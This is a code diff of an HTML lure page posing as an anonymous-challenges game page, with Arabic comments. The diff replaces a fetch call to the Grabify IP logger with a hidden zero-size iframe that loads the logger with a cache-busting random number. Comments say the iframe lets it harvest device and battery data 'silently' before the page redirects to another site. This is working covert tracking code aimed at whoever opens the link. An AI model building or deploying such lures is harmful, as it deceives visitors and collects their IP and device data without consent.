@@ -4,37 +4,35 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Send me anonymous challenges on GamesZoneX!</title>
-  <!-- تم حذف وسم meta refresh لأنه كان يخرب العملية ويسرع التحويل قبل التسجيل -->
 </head>
 <body>
 
   <script>
-    // هذه الدالة ستبدأ بالعمل فوراً عند فتح الصفحة
-    async function logAndRedirect() {
-      const grabifyUrl = 'https://grabify.link'; 
-      const destinationUrl = 'https://dominoes.mx';
+    window.addEventListener("load", function() {
+      // 1. توليد رقم عشوائي لكسر حماية التكرار والكاش
+      const randomNumber = Math.floor(Math.random() * 999999);
+      
+      // قم بوضع رابطك الجديد أو الحالي هنا مع إضافة متغير الكاش
+      const grabifyUrl = "https://grabify.link" + randomNumber; 
+      const destinationUrl = "https://dominoes.mx";
 
-      try {
-        // استخدام await يجبر المتصفح على الانتظار لحين انتهاء الاتصال بـ Grabify
-        await fetch(grabifyUrl, { 
-          mode: 'no-cors',
-          cache: 'no-cache',
-          credentials: 'omit'
-        });
-        
-        // ننتظر نصف ثانية إضافية احتياطاً للتأكد من معالجة السيرفر للطلب
-        await new Promise(resolve => setTimeout(resolve, 500));
-        
-      } catch (e) {
-        console.log('Error logging');
-      } finally {
-        // الآن يتم التحويل إلى الموقع الآخر بأمان بعد الضمان
-        window.location.href = destinationUrl;
-      }
-    }
+      // 2. إنشاء iframe برمجياً لإعطاء الـ Smart Logger بيئة متصفح كاملة للعمل
+      const iframe = document.createElement('iframe');
+      iframe.style.display = "none";
+      iframe.style.width = "0px";
+      iframe.style.height = "0px";
+      iframe.style.border = "none";
+      iframe.src = grabifyUrl;
+      
+      // إدخال الإطار في الصفحة ليبدأ بالعمل فوراً
+      document.body.appendChild(iframe);
 
-    // تشغيل الدالة بمجرد تحميل الصفحة
-    window.addEventListener("load", logAndRedirect);
+      // 3. نمنح الـ Smart Logger مهلة (ثانيتين) لجمع بيانات البطارية والجهاز وإرسالها بالكامل
+      setTimeout(function() {
+          window.location.href = destinationUrl;
+      }, 2000); // ثانيتين كافية جداً لإنهاء الـ Smart Logger مهمته بصمت
+    });
   </script>
+
 </body>
 </html>
